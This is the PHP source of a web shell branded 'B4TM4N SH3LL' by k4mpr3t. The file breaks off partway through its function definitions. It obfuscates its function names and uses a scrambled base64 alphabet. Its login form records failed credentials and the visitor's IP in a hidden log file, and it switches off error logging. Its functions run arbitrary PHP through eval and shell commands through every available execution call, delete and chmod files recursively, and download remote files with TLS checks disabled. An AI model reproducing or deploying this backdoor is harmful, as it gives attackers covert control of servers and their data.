<?php $d0="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";$g1=array("title"=>"B4TM4N SH3LL","subtitle"=>"V3RS10N 2.7 ~ k4mpr3t","themes"=>"br34k","debug"=>false );$s2=explode(':',$d0);session_start();function any($t3,$l4){return array_key_exists($t3,$l4);}function urle($t3){return B64E(urlencode($t3));}function urld($t3){return urldecode(B64D(urldecode($t3)));}define('_',DIRECTORY_SEPARATOR);foreach($_SERVER as $k5=>$u6){define(strtolower($k5),$_SERVER[$k5]);}function B64E($t3){$s7="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";$s8="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";$v9="b";$a10="a";$d11="s";$t12="e";$w13="6";$q14="4";$d15="_";$q16="e";$y17="n";$t18="c";$w19="o";$k20="d";$j21="e";$p22=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$q16.$y17.$t18.$w19.$k20.$j21;return strtr($p22($t3),$s7,$s8);}function B64D($t3){$s7="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";$s8="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";$v9="b";$a10="a";$d11="s";$t12="e";$w13="6";$q14="4";$d15="_";$q16="d";$y17="e";$t18="c";$w19="o";$k20="d";$j21="e";$p22=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$q16.$y17.$t18.$w19.$k20.$j21;return $p22(strtr($t3,$s7,$s8));}function error($w23,$y24,$o25,$o26){switch($w23){case E_PARSE:case E_STRICT:$m27='# DEBUG';break;case E_NOTICE:case E_USER_NOTICE:$m27='# NOTICE';break;case E_USER_ERROR:case E_RECOVERABLE_ERROR:$m27='# ERROR';break;case E_WARNING:case E_CORE_WARNING:case E_COMPILE_WARNING:case E_USER_WARNING:$m27='# WARNING';break;case E_ERROR:case E_CORE_ERROR:case E_COMPILE_ERROR:$m27='# FATAL ERROR';break;default:$m27='# UNKNOWN ERROR';break;}echo '<div class="error">';echo $m27;echo "<br>";echo $y24;echo "<br>";echo $o25.' (Line: '.$o26.')';echo "<br>";echo "<br>";echo "</div>";}if(request_method=="POST"){if(any("username",$_REQUEST)&&any("password",$_REQUEST)&&any("signin",$_REQUEST)){if((B64E($_REQUEST['username'])==$s2[0])&&(sha1(md5($_REQUEST['password']))==$s2[1])){session_regenerate_id();$_SESSION['action']=array("username"=>B64E($_REQUEST['username']),"password"=>sha1(md5($_REQUEST['password'])));}else{$y28=array("Username: ".$_REQUEST['username'],"Password: ".$_REQUEST['password'],"Remote IP: ".remote_addr,"Time: ".date('Y-m-d H:i:s'),"-------------------------\r\n",);$r29=dirname(__FILE__)._.'.log';$o30=implode($y28,"\r\n");$u31=fopen($r29,'a+');fwrite($u31,$o30);fclose($u31);}}}if(!any("action",$_SESSION)){?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex"/>
<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
<title>Signin</title>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<style type='text/css'>
	html,body{
	height:100%;
	}
	body{
	display:-ms-flexbox;
	display:-webkit-box;
	display:flex;
	-ms-flex-align:center;
	-ms-flex-pack:center;
	-webkit-box-align:center;
	align-items:center;
	-webkit-box-pack:center;
	justify-content:center;
	padding-top:40px;
	padding-bottom:40px;
	background-color:#f5f5f5;
	}
	.form-signin{
	width:100%;
	max-width:330px;
	padding:15px;
	margin:0 auto;
	}
	.form-signin.checkbox{
	font-weight:400;
	}
	.form-signin.form-control{
	position:relative;
	box-sizing:border-box;
	height:auto;
	padding:10px;
	font-size:16px;
	}
	.form-signin.form-control:focus{
	z-index:2;
	}
	.form-signin input[type="email"]{
	margin-bottom:-1px;
	border-bottom-right-radius:0;
	border-bottom-left-radius:0;
	}
	.form-signin input[type="password"]{
	margin-bottom:10px;
	border-top-left-radius:0;
	border-top-right-radius:0;
	}
</style>
</head>
<body class="text-center">
	<form class="form-signin" method='post'>
		<h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
		<label for="username" class="sr-only">Email address</label>
		<input type="text" name="username" id="username" class="form-control" placeholder="Username" autocomplete="off" required autofocus>
		<label for="password" class="sr-only">Password</label>
		<input type="password" name="password" id="password" class="form-control" placeholder="Password" autocomplete="off" required>
		<button class="btn btn-lg btn-primary btn-block" type="submit" name="signin" value="signin">Sign In</button>
		<p class="mt-5 mb-3 text-muted">&copy;<?=date('Y')?></p>
	</form>
</body>
</html><?php }else{ob_start();if(!strpos(strval(ini_get('disable_functions')),'set_time_limit')){set_time_limit(0);}if($g1['debug']==true){set_error_handler('error');error_reporting(E_ERROR|E_WARNING|E_PARSE|E_NOTICE);}else{error_reporting(0);ini_set('error_log',null);ini_set('html_errors',0);ini_set('log_errors',0);ini_set('log_errors_max_len',0);ini_set('display_errors',0);ini_set('display_startup_errors',0);}ini_set('max_execution_time','600');ini_set('memory_limit','256M');$s32=B64D("FT06ACQoAXYrvHYXMUIMMV5e");$z33=$g1['title'];$y34=microtime(true);?><!DOCTYPE html>
<html>
<head>
<title>
<?=$z33?>
</title>
<meta name='author' content='k4mpr3t'/>
<link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
<style type="text/css">

	<?php if(strtolower($g1['themes'])=='d4rk'):?>
	:root {
		--background-color:#000; 
		--color:#00ff00;
		--txt-color: #fff;
		--txt-hover-color: #fff;
		--border-color: #222;
		--border-hover-color: #333;
		--table-odd-color : #000;
		--table-even-color : #111;
		--table-hover-color : #222;
		--button-color : #111;
		--button-hover-color : #222;
	}
	<?php endif;?>

	<?php if(strtolower($g1['themes'])=='br34k'):?>
	:root {
		--background-color:#fff; 
		--color:#000;
		--txt-color: #000;
		--txt-hover-color: #666;
		--border-color: #111;
		--border-hover-color: #222;
		--table-odd-color : #eee;
		--table-even-color : #ddd;
		--table-hover-color : #ccc;
		--button-color : #ccc;
		--button-hover-color : #bbb;
	}
	<?php endif;?>

	@keyframes blinker{70%{opacity:0}}
	*,html{margin:0;padding:0;line-height:1rem}
	body{background:var(--background-color);color:var(--color);font-family:monospace;font-size:13px}
	::-moz-selection{background:var(--color);color:var(--background-color)}
	::selection{background:var(--color);color:var(--background-color)}
	img{vertical-align:bottom}
	hr{border:1px solid var(--border-color);margin:3px 0px 0px}
	a{color:var(--color);text-decoration:none}
	a:hover{color:var(--txt-hover-color)}
	a.active{color:var(--txt-color)}
	a.action{font-size:12px;padding:5px;margin:0px;background:var(--button-color);color:var(--txt-color);border:1px solid #222;cursor:pointer;outline:none;display:inline-block}
	a.action:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
	label{display:inline-block;min-width:75px;padding-right:15px}
	iframe{background:var(--txt-hover-color)}
	fieldset {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;box-sizing:border-box;min-height:154px}
	textarea {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
	input[type=submit]{background:var(--button-color);border:1px solid var(--border-color);color:var(--txt-color);line-height:25px;padding:0 10px;cursor:pointer;outline:none}
	input[type=submit]:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
	input[type=text]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	input[type=number]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	input[type=file]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:2px;outline:none;box-sizing:border-box}
	select{background:var(--background-color);color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
	#wrapper{width:93%;margin:37px auto 40px}
	#info{margin:0 0 23px 0;padding:0 13px 0 0}
	#header{display:inline-block;width:100%}
	.header-left{float:left;width:66%}
	.header-right{float:right;width:34%}
	#connect{display:inline-block;width:100%}
	.connect-left{float:left;width:49%}
	.connect-right{float:right;width:49%}
	#database-session{display:inline-block;width:100%}
	.database-query{float:left;width:49%}
	.database-process{float:right;width:49%}
	#php{display:inline-block}
	.php-left{float:left;width:49%}
	.php-right{float:right;width:49%}
	.divide{width:100%;display:inline-block}
	.divide-left{float:left;width:50%}
	.divide-right{float:right;width:50%}
	.mail input[type=text]{width:100%;display:block}
	.database-breadcrumb{margin:10px 0 0;display:inline-block;font-style: italic;}
	#update{text-align:center}
	#php-configuration{text-align:center}
	.error{animation:blinker 1s linear infinite;background:var(--color);color:var(--background-color);padding:10px;margin:10px;}
	#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color)}
	.content{border:1px solid var(--border-color);padding:10px;overflow:auto;overflow-y:hidden}
	#process-list{padding:25px;margin:25px auto 0px;border:1px solid var(--border-color);overflow:scroll;overflow-y:hidden}
	#process-list s{text-decoration:none}
	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid var(--border-color)}
	.menu{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
	.menu > ul{list-style:none;margin:0;padding:0}
	.menu > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu > ul > li:hover{cursor:pointer}
	.menu-tools{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
	.menu-tools > ul{list-style:none;margin:0;padding:0}
	.menu-tools > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
	.menu-tools > ul > li:hover{cursor:pointer}
	.menu-directory{;margin-bottom:10px}
	.new{margin-right:15px;}
	.hash label{min-width:40px;display:inline-block;padding-right:15px}
	.hash-capture label{margin:10px 0;display:inline-block}
	.hash input[type=radio]{margin-right:10px;display:inline-block;vertical-align:middle}
	.auto-number table{counter-reset:row_}
	.auto-number table tbody tr td:first-child{counter-increment:row_;vertical-align:middle;text-align:center}
	.auto-number table tbody tr td:first-child::before{content:counter(row_)}
	#title{text-align:center;font-size:44px;margin:0;color:var(--txt-color);margin-bottom:15px}
	#subtitle{text-align:center;font-size:22px;margin:0;color:var(--txt-color);margin-top:8px}
	#tools{min-height:125px;padding:10px;border-radius:5px}
	#account{min-height:100px;padding:10px;border-radius:5px}
	#thanks{text-align:center;font-size:16px;font-family:courier;padding:5% 0}
	#footer{margin:25px auto}
	#copyrights{text-align:center}
	#pageload{text-align:center}
	#query{margin-top:10px}
	#database-query{overflow:auto;margin:10px 0}
	#hexdump{height:300px;overflow:auto;overflow-x:hidden}
	#terminal{min-height:100px;padding:10px;border-radius:5px}
	#terminal-input{border:none}
	#curdir-terminal{min-width:10px}
	#database{min-height:100px;padding:10px;border-radius:5px}
	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
	#phpinfo table{margin:25px 0}
	#phpinfo tr:nth-child(odd){background:var(--background-color)}
	#phpinfo tr:nth-child(even){background:var(--border-color)}
	#phpinfo td,th{padding:5px;border:1px solid var(--border-color)}
	#phpinfo h1{margin:10px 0}
	#phpinfo h2{margin:10px 0}
	#phpinfo.e{width:200px}
	#phpinfo.v{word-break:break-word}
	#phpinfo img{display:none}
	#phpinfo hr{border:none}
	.line h2{position:relative;top:12px;width:100px;display:inline;background:var(--background-color);padding:0 10px;color:var(--txt-color)}
	.line{border-bottom:2px solid var(--color);text-align:center;width:287px;margin:auto}
	.table {width:100%;margin:10px 0}
	.table td,th{padding:5px;border:1px solid var(--border-color);max-width:250px;min-width:25px}
	.table td.kanan{word-break:break-word}
	.table td.kiri{width:30%}
	.table tr:nth-child(odd){background:var(--table-odd-color)}
	.table tr:nth-child(even){background:var(--table-even-color)}
	.table tr:hover td{background:var(--table-hover-color)}
	.table tfoot td{padding:10px;text-align:center}
	.database-table > td.table {word-break:normal;}
	.map-switch{display:inline-block}
	.form-fix{margin:-15px 0}
	.frmsource{margin-top:10px}
	.hexdump{width:100%;padding:5px;margin-bottom:5px}
	.hexdump td{text-align:left}
	.highlight{background:var(--background-color);word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
	.hash-capture{display:inline-block;width:100%}
	.hash-capture-left{float:left;width:49%}
	.hash-capture-right{float:right;width:49%}
	.clr{clear:both}
	.on{color:var(--txt-color)}
	.off{color:red}
	.result{padding:10px}
	.sortable thead{cursor:pointer}
	.disablefunc{overflow-wrap:break-word}
	.loading{vertical-align:middle;width:16px;height:16px;display:inline-block;background:url('data:image/gif;base64,R0lGODlhEAAQAPIAAAAAAP///zw8PLy8vP///5ycnHx8fGxsbCH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==')}
</style>
<script type="text/javascript">
function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[£$¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
</script>
<script type="text/javascript">
	var xhr;
	window.onload=function(){
		getFocus("terminal-input");
		getFocus("find-action");
		getFocus("sourcefocus");
		getFocus("php-code");
	};
	function getFocus(id){
		if(document.getElementById(id)!==null){
		document.getElementById(id).focus();}
	}
	function getAjax(txt,id,method,url){
		var xmlhttp;
		var urlf="";
		var data=new FormData();
		var params=url.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]=='text-encode'){
		data.append(val[0],val[1]);
		}else{if(val[0].indexOf('?')<0)
		{urlf+='&'+val[0]+'='+val[1];}}}
		if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();
		}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
		xmlhttp.onreadystatechange=function(){
		sts=["Request Not Initialized",
		"Server Connection Established",
		"Request Received",
		"Processing Request",
		"Request Finished"];
		if(xmlhttp.readyState==4&&xmlhttp.status==200){
		if(txt){document.getElementById(id).innerHTML=xmlhttp.responseText;
		}else{document.getElementById(id).value=xmlhttp.responseText;}
		}else{
		if(txt){document.getElementById(id).innerHTML=
		"[Status] "+"Please Wait... <div class='loading'></div><br>"+
		"[State] "+sts[xmlhttp.readyState]+"<br>"+
		"[Response] "+xmlhttp.response;
		}else{document.getElementById(id).value=
		"[Status] "+"Please Wait...\n"+
		"[State] "+sts[xmlhttp.readyState]+"\n"+
		"[Response] "+xmlhttp.response;}}
		};
		xmlhttp.open(method,window.location.href+urlf,true);
		xmlhttp.send(data);
		xhr=xmlhttp;
	}
	function ajaxAbort(txt,id){
		if(txt){document.getElementById(id).innerHTML="Canceled";
		}else{document.getElementById(id).value="Canceled";}
		xhr.abort();
	}
	function checkAll(){
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		document.getElementsByName('chk[]')[i].checked=document.getElementsByName('check-all')[0].checked;}
	}
	function checkCount(id){
		count=1;
		for(var i=0;i<document.getElementsByName('chk[]').length;i++){
		if(document.getElementsByName('chk[]')[i].checked){
		document.getElementById(id).innerHTML=count++;
		}else{document.getElementById(id).innerHTML=count-1;}}
	}
	function mapSwitch(id,id2){
		var a=document.getElementById(id);
		var b=document.getElementById(id2);
		if(a.style.display=='inline-block'){
		a.style.display='none';
		b.style.display='inline-block';
		}else{a.style.display='inline-block';
		b.style.display='none';}
	}
	function getParameter(p) {
		var searchString=window.location.search.substring(1),
		i,val,params=searchString.split("&");
		for(i=0;i<params.length;i++){
		val=params[i].split("=");
		if(val[0]==p){
		return val[1];}}
		return null;
	}
</script>
</head>
<body>
<div id="wrapper"><?php $a35=any("c",$_SESSION)?urld($_SESSION['c']):getcwd();$f36=any("d",$_REQUEST)?urld($_REQUEST['d']):$a35;$n37=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$f36;function Unix(){return(strtolower(substr(PHP_OS,0,3))!="win");}function Evil($t3,$l4=false){$s8=$l4==true?"?>".$t3."<?php ":$t3;$w38=@eval($s8);if(error_get_last()){print"\n[Error] ";return print_r(error_get_last());}return $w38;}function Execute($t3){$t3=$t3.' 2>&1';if(!is_null($y39=`$t3`)){return $y39;}elseif(function_exists('system')){ob_start();$o40=system($t3);$o41=ob_get_contents();ob_end_clean();return $o41;}elseif(function_exists('exec')){$o41="";exec($t3,$w42);foreach($w42 as $c43){$o41.=$c43;}return $o41;}elseif(function_exists('shell_exec')){$o41=shell_exec($t3);return $o41;}elseif(function_exists('pcntl_exec')){$o41=pcntl_exec($t3);return $o41;}elseif(function_exists('passthru')){ob_start();$o44=passthru($t3);$o41=ob_get_contents();ob_end_clean();return $o41;}elseif(function_exists('proc_open')){$r45=proc_open($t3,array(array("pipe","r"),array("pipe","w"),array("pipe","w")),$t46);$o41=stream_get_contents($t46[1]);return $o41;}elseif(function_exists('popen')){$o41="";$l47=popen($t3,"r");while(!feof($l47)){$o41.=fread($l47,1024);}pclose($l47);return $o41;}return "R.I.P Command";}function Remove($t3){if(is_dir($t3)){if($o48=@opendir($t3)){while(false!==($l49=readdir($o48))){if($l49!="."&&$l49!=".."){Remove($t3._.$l49);}}closedir($o48);}return rmdir($t3);}elseif(is_file($t3)){return unlink($t3);}return false;}function ChmodRecursive($t3,$l4){if(is_dir($t3)){if($o48=@opendir($t3)){while(false!==($l49=readdir($o48))){if($l49!="."&&$l49!=".."){ChmodRecursive($t3._.$l49);}}closedir($o48);}return chmod($t3,$l4);}elseif(is_file($t3)){return chmod($t3,$l4);}return false;}function CopyRecursive($t3,$l4){if(is_dir($t3)){@mkdir($l4);if($o48=@opendir($t3)){while(false!==($l49=readdir($o48))){if($l49!="."&&$l49!=".."){CopyRecursive($t3._.$l49,$l4._.$l49);}}closedir($o48);}return true;}elseif(is_file($t3)){return copy($t3,$l4);}return false;}function MoveRecursive($t3,$l4){if(is_dir($t3)){@mkdir($l4);if($o48=@opendir($t3)){while(false!==($l49=readdir($o48))){if($l49!="."&&$l49!=".."){MoveRecursive($t3._.$l49,$l4._.$l49);}}closedir($o48);}return Remove($t3);}elseif(is_file($t3)){if(copy($t3,$l4)){return unlink($t3);}}return false;}function GetDownloadUrl($t3,$l4){global $s32;$e50=fopen($l4,"w");$b51=curl_init();curl_setopt($b51,CURLOPT_USERAGENT,$s32);curl_setopt($b51,CURLOPT_URL,$t3);curl_setopt($b51,CURLOPT_FILE,$e50);curl_setopt($b51,CURLOPT_HEADER,0);curl_setopt($b51,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($b51,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($b51,CURLOPT_FOLLOWLOCATION,1);$a52=curl_exec($b51);if(curl_error($b51))return curl_error($b51);curl_close($b51);fclose($e50);return true;}function GetUrlExists($t3){global $s32;$b51=curl_init();curl_setopt($b51,CURLOPT_USERAGENT,$s32);curl_setopt($b51,CURLOPT_URL,$t3);curl_setopt($b51,CURLOPT_TIMEOUT,5);curl_setopt($b51,CURLOPT_CONNECTTIMEOUT,5);curl_setopt($b51,CURLOPT_RETURNTRANSFER,1);$a52=curl_exec($b51);$k53=curl_getinfo($b51,CURLINFO_HTTP_CODE);if(curl_error($b51))return curl_error($b51);curl_close($b51);return($k53>=200&&$k53<300);}function GetUrlContent($t3){global $s32;$b51=curl_init();curl_setopt($b51,CURLOPT_USERAGENT,$s32);curl_setopt($b51,CURLOPT_URL,$t3);curl_setopt($b51,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($b51,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($b51,CURLOPT_RETURNTRANSFER,1);$a52=curl_exec($b51);if(curl_error($b51))return curl_error($b51);curl_close($b51);return $a52;}function 